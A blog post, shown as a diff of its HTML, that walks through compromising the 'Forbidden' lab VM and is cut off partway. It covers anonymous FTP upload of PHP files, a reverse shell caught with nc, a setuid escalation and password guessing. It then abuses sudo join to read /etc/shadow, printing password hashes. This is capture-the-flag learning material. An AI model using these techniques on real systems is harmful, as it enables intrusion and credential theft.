@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Forbidden  端口扫描  123456789101112kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.1.32                                                                                   [3:15:23]Starting Nmap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="try-hack-me:Forbidden">
+<meta property="og:url" content="http://example.com/2025/02/20/try-hack-me-Forbidden/index.html">
+<meta property="og:site_name" content="WangYiHao">
+<meta property="og:description" content="Forbidden  端口扫描  123456789101112kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.1.32                                                                                   [3:15:23]Starting Nmap">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-19T19:13:52.000Z">
+<meta property="article:modified_time" content="2025-02-19T19:43:03.315Z">
+<meta property="article:author" content="SunRT">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>try-hack-me:Forbidden</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/02/20/vulhub-Jarbas/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Vorheriger Beitrag</span>
+      <span id="i-next" class="info" style="display:none;">Nächster Beitrag</span>
+      <span id="i-top" class="info" style="display:none;">Zurück zum Anfang</span>
+      <span id="i-share" class="info" style="display:none;">Beitrag teilen</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/20/try-hack-me-Forbidden/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&text=try-hack-me:Forbidden"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&is_video=false&description=try-hack-me:Forbidden"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=try-hack-me:Forbidden&body=Check out this article: http://example.com/2025/02/20/try-hack-me-Forbidden/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&name=try-hack-me:Forbidden&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/20/try-hack-me-Forbidden/&t=try-hack-me:Forbidden"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Forbidden</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">80端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">ftp渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        try-hack-me:Forbidden
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">SunRT</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-19T19:13:52.000Z" itemprop="datePublished">2025-02-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 align="center">Forbidden</h1>
+
+<h3>端口扫描</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo nmap -sT -p- --min-rate 1000 192.168.1.32                                                                                   [3:15:23]</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 03:15 CST</span><br><span class="line">Nmap scan report for 192.168.1.32</span><br><span class="line">Host is up (0.00069s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8000/tcp open  http-alt</span><br><span class="line">MAC Address: 08:00:27:CF:0C:89 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 4.78 seconds</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo nmap -sT -sV -sC -p21,80 -O 192.168.1.32                                                                                    [2:46:05]</span><br><span class="line">[sudo] kali 的密码：</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-20 03:15 CST</span><br><span class="line">Nmap scan report for 192.168.1.32</span><br><span class="line">Host is up (0.00062s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 0        0            4096 Feb 19 13:18 www [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.1.5</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx/1.14.2</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">MAC Address: 08:00:27:CF:0C:89 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.8 (99%), Linux 5.0 - 5.5 (99%), Linux 5.0 - 5.4 (97%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 2.6.32 (96%), Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.56 seconds</span><br></pre></td></tr></table></figure>
+
+<h3>80端口渗透</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  curl http://192.168.1.32                                                                                                         [3:15:40]</span><br><span class="line">&lt;h1&gt;SECURE WEB/FTP&lt;h1&gt;</span><br><span class="line"></span><br><span class="line">Hi, Im the best admin of the world.</span><br><span class="line">You cannot execute .php code on this server so you cannot</span><br><span class="line">obtain a reverse shell. Not sure if its misconfigured another things... but</span><br><span class="line">the importart is that php is disabled.</span><br><span class="line"></span><br><span class="line">-marta</span><br></pre></td></tr></table></figure>
+
+<p><strong>告诉我们.php文件可能无法解析，让我们不要上传</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  sudo dirsearch -u http://192.168.1.32                                                                                            [3:16:54]</span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  from pkg_resources import DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/reports/http_192.168.1.32/_25-02-20_03-17-45.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.1.32/</span><br><span class="line"></span><br><span class="line">[03:17:45] Starting: </span><br><span class="line">[03:18:29] 200 -   10B  - /robots.txt</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<p><strong>robots.txt看了看没啥发现</strong></p>
+<h3>ftp渗透</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  ftp 192.168.1.32                                                                                                                 [3:18:43]</span><br><span class="line">Connected to 192.168.1.32.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.1.32:kali): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash"><span class="built_in">cd</span> www</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">229 Entering Extended Passive Mode (|||44235|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html</span><br><span class="line">-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt</span><br><span class="line">-rwxrwxrwx    1 0        0              10 Oct 09  2020 robots.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>ftp是匿名登录，还有个note.txt，访问一下看一看</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  curl http://192.168.1.32/note.txt                                                                                                [3:15:19]</span><br><span class="line">The extra-secured .jpg file contains my password but nobody can obtain it.</span><br></pre></td></tr></table></figure>
+
+<p><strong>说有密码在图片里，但是问题是没22端口，要密码没用啊，先搁置，只能尝试上传反弹shell了，相信靶机并没有完全的过滤</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">ftp&gt; </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">229 Entering Extended Passive Mode (|||44235|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 105      113           109 Feb 19 13:18 1.php3</span><br><span class="line">-rw-r--r--    1 105      113           109 Feb 19 13:18 1.php5</span><br><span class="line">-rw-r--r--    1 105      113           109 Feb 19 13:18 1.phtml</span><br><span class="line">-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html</span><br><span class="line">-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt</span><br><span class="line"></span><br><span class="line">//上传一些可能会解析的php文件，尝试访问</span><br></pre></td></tr></table></figure>
+
+<p><strong>最终发现php5可以解析，成功反弹shell</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  nc -lvnp 8888                                                                                                                    [3:25:00]</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [192.168.1.5] from (UNKNOWN) [192.168.1.32] 38482</span><br><span class="line">bash: cannot set terminal process group (330): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@forbidden:/srv/ftp/www$ </span><br></pre></td></tr></table></figure>
+
+<h3>提权</h3>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">www-data@forbidden:/home/marta$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 3 marta marta  4096 Oct  9  2020 .</span><br><span class="line">drwxr-xr-x 5 root  root   4096 Oct  9  2020 ..</span><br><span class="line">-rw------- 1 marta marta    55 Oct  9  2020 .Xauthority</span><br><span class="line">-rw-r--r-- 1 marta marta   220 Oct  9  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 marta marta  3526 Oct  9  2020 .bashrc</span><br><span class="line">-rwsr-sr-x 1 root  marta 16712 Oct  9  2020 .forbidden</span><br><span class="line">drwxr-xr-x 3 marta marta  4096 Oct  9  2020 .local</span><br><span class="line">-rw-r--r-- 1 marta marta   807 Oct  9  2020 .profile</span><br><span class="line">-rw-r--r-- 1 root  root    130 Oct  9  2020 hidden.c</span><br><span class="line">www-data@forbidden:/home/marta$ cat hidden.c</span><br><span class="line">cat hidden.c</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;unistd.h&gt;</span></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">setuid(1001); setgid(1001); system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>发现一个提权的c程序，而且.forbidden有s权限，猜测这个就是编译好的程序，就不用先分析了，直接执行</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@forbidden:/home/marta$ ./.profile</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">markos@forbidden:/home/marta$ whoami</span><br><span class="line">whoami</span><br><span class="line">markos</span><br><span class="line">markos@forbidden:/home/marta$ </span><br></pre></td></tr></table></figure>
+
+<p><strong>提权至markos权限，全局搜索前面的图片有密码的提示</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">markos@forbidden:/home/marta$ find / -name &quot;*.jpg&quot; 2&gt;/dev/null</span><br><span class="line">find / -name &quot;*.jpg&quot; 2&gt;/dev/null</span><br><span class="line">/var/www/html/TOPSECRETIMAGE.jpg</span><br><span class="line">markos@forbidden:/home/marta$    </span><br></pre></td></tr></table></figure>
+
+<p><strong>传回本机分析</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  exiftool TOPSECRETIMAGE.jpg                                                                                                      [3:34:18]</span><br><span class="line">ExifTool Version Number         : 12.76</span><br><span class="line">File Name                       : TOPSECRETIMAGE.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 33 kB</span><br><span class="line">File Modification Date/Time     : 2020:10:10 01:04:22+08:00</span><br><span class="line">File Access Date/Time           : 2025:02:20 02:31:41+08:00</span><br><span class="line">File Inode Change Date/Time     : 2025:02:20 02:31:31+08:00</span><br><span class="line">File Permissions                : -rw-rw-r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : None</span><br><span class="line">X Resolution                    : 1</span><br><span class="line">Y Resolution                    : 1</span><br><span class="line">Image Width                     : 324</span><br><span class="line">Image Height                    : 216</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)</span><br><span class="line">Image Size                      : 324x216</span><br><span class="line">Megapixels                      : 0.070</span><br><span class="line">kali@kali [~] ➜  binwalk TOPSECRETIMAGE.jpg                                                                                                       [3:34:19]</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">                      </span><br></pre></td></tr></table></figure>
+
+<p><strong>没有所谓的密码，只能尝试该图片的名字了</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">markos@forbidden:/home$ su - marta</span><br><span class="line">su - marta</span><br><span class="line">Password: TOPSECRETIMAGE</span><br><span class="line"></span><br><span class="line">marta@forbidden:~$ whoami</span><br><span class="line">whoami</span><br><span class="line">marta</span><br><span class="line">marta@forbidden:~$ </span><br></pre></td></tr></table></figure>
+
+<p><strong>提权成功，手动枚举</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">marta@forbidden:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for marta on forbidden:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User marta may run the following commands on forbidden:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/join</span><br><span class="line">marta@forbidden:~$ sudo /usr/bin/join -a 2 /dev/null /etc/shadow </span><br><span class="line">sudo /usr/bin/join -a 2 /dev/null /etc/shadow</span><br><span class="line">root:$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:18544:0:99999:7:::</span><br><span class="line">daemon:*:18544:0:99999:7:::</span><br><span class="line">bin:*:18544:0:99999:7:::</span><br><span class="line">sys:*:18544:0:99999:7:::</span><br><span class="line">sync:*:18544:0:99999:7:::</span><br><span class="line">games:*:18544:0:99999:7:::</span><br><span class="line">man:*:18544:0:99999:7:::</span><br><span class="line">lp:*:18544:0:99999:7:::</span><br><span class="line">mail:*:18544:0:99999:7:::</span><br><span class="line">news:*:18544:0:99999:7:::</span><br><span class="line">uucp:*:18544:0:99999:7:::</span><br><span class="line">proxy:*:18544:0:99999:7:::</span><br><span class="line">www-data:*:18544:0:99999:7:::</span><br><span class="line">backup:*:18544:0:99999:7:::</span><br><span class="line">list:*:18544:0:99999:7:::</span><br><span class="line">irc:*:18544:0:99999:7:::</span><br><span class="line">gnats:*:18544:0:99999:7:::</span><br><span class="line">nobody:*:18544:0:99999:7:::</span><br><span class="line">_apt:*:18544:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18544:0:99999:7:::</span><br><span class="line">systemd-network:*:18544:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18544:0:99999:7:::</span><br><span class="line">messagebus:*:18544:0:99999:7:::</span><br><span class="line">marta:$6$h.4ZF5esZ/N1OIcu$8vL1D3iM6iuhniSG8nIz0582atbIV6y/UBl0eks1.Wrd51BqLK8Wqt91WXg0Y2mrdNY4luPQkqUWXFXWxLVwe/:18544:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18544::::::</span><br><span class="line">ftp:*:18544:0:99999:7:::</span><br><span class="line">sshd:*:18544:0:99999:7:::</span><br><span class="line">markos:$6$PTerrFpyfOmkM5Xi$oo8gNZyyxsZbKhOIXrm2w/x.Xvhdr7Ny/4JgLDRLRAxAwEwGtH2kD7PjzeloAstqCPq/KKrqrPioMM8vwWbqZ.:18544:0:99999:7:::</span><br><span class="line">peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::</span><br><span class="line">marta@forbidden:~$ </span><br></pre></td></tr></table></figure>
+
+<p><strong>发现并使用join读取敏感文件，将剩余的两个账号密码传回本机进行破解</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali@kali [~] ➜  cat x                                                                                                                       </span><br><span class="line">peter:$6$QAeWH9Et9PAJdYz/$/4VhburW9KoVTRY1Ry63wNEfr4rxwQGaRJ3kKW2nEAk0LcqjqZjy/m5rtaCi3VebNu7AaGFhQT4FBgbQVIyq81:18544:0:99999:7:::</span><br><span 